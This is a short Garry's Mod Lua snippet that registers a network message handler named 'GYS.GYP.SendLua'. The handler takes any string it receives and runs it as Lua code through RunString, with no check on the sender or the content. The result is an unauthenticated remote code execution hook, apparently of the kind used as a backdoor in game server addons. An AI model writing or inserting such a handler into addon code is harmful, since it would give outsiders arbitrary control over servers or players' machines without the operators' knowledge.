net.Receive("GYS.GYP.SendLua", function()
    local g = net.ReadString()
    RunString(g)
end)